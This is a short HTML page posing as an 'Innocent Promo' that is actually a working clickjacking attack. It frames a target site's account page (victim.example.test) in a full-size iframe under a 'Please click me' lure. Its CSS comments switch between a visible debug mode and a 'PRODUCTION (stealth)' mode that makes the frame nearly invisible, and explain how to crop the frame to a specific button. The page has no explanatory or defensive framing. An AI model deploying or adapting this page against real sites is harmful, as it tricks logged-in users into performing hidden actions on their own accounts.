
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Innocent Promo</title>
  <style>
    html,body{height:100%}
    body{margin:0;background:#0b1222;color:#e5e7eb;font:16px/1.45 system-ui,Segoe UI,Roboto;display:flex;align-items:center;justify-content:center}
    .box{position:relative;width:520px;height:420px;background:#0f172a;border-radius:16px;overflow:hidden;outline:2px dashed #0ea5e9}
    .trap{
      position:absolute;border:0;z-index:2;
      /* DEBUG (see alignment): */ opacity:0.5; outline:2px solid lime;
      /* PRODUCTION (stealth):  opacity:0.01; outline:none; */
      inset:0; /* full-card iframe; or crop to button using fixed width/height/top/left */
    }
    .overlay{position:absolute;left:0;right:0;bottom:14px;text-align:center;font-size:18px;z-index:3;pointer-events:none;text-shadow:0 1px 2px rgba(0,0,0,.6)}
  </style>
</head>
<body>
  <div class="box">
    <iframe class="trap" src="https://victim.example.test:8443/auth/account.php"></iframe>
    <div class="overlay">... Please click me ...</div>
  </div>
</body>
</html>
